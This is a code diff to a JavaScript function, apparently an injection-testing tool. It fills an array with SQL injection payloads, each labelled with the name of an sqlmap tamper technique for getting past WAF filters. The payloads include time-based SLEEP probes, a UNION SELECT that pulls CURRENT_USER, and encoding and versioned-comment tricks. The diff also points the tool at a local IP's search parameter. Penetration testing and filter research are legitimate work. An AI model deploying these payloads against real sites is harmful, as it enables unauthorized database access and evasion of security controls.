@@ -74,11 +74,32 @@ function startSQL(iterCount){
     //TODO: the whole thing
 
     var sqlDatabase = [
-    "",
-    "",
-    "",
-    "",
-    ""]
+    '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871', // apostrophemask
+    '1 AND %00%271%00%27=%00%271', //apostrophenullencode
+    '1 AND 1=1%00', // appendnullbyte
+    'MScgQU5EIFNMRUVQKDUpIw==', // base64encode
+    '1 AND A BETWEEN B AND B--', //between
+    'SELECT%09id FROM%09users WHERE%09id LIKE 1', // bluecoat
+    '%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545', //chardoubleencode
+    '%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45', //charencode
+    '\\\\u0053\\\\u0045\\\\u004C\\\\u0045\\\\u0043\\\\u0054\\\\u0020\\\\u0046\\\\u0049\\\\u0045\\\\u004C\\\\u0044\\\\u0020\\\\u0046\\\\u0052\\\\u004F\\\\u004D\\\\u0020\\\\u0054\\\\u0041\\\\u0042\\\\u004C\\\\u0045', //charunicodeescape
+    'LIMIT 3 OFFSET 2',//commaLessLimit
+    'MID(VERSION() FROM 1 FOR 1)',//commalessmid
+    'SELECT ABS/**/(1)', //commalessparenthesis
+    'CONCAT_WS(MID(CHAR(0),0,0),1,2)', //concat2concatws
+    'SELECT * FROM users WHERE id LIKE 1',
+    '1\\\\" AND SLEEP(5)#', //escape quotes
+    '1 AND GREATEST(A,B+1)=A', //greatest
+    "value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa", //halfversionedmorekeywords
+    '1&#39;&#32;AND&#32;SLEEP&#40;5&#41;&#35;', //htmlencode
+    'CASE WHEN ISNULL(1) THEN (2) ELSE (1) END', //ifnull2casewhenisnull
+    'IF(ISNULL(1),2,1)', //ifnull2ifisnull
+    'SELECT table_name FROM INFORMATION_SCHEMA/**/.TABLES', //informationschemacomment
+    '1 AND LEAST(A,B+1)=B+1', //least
+    'insert', //lowercase
+    '1 /*!30874AND 2>1*/--', //modsecurityversioned
+    '1 UNIOUNIONN SELESELECTCT 2--', //nonrecursivereplacement
+]
 
 
     var site = "http://192.168.1.29/?s="
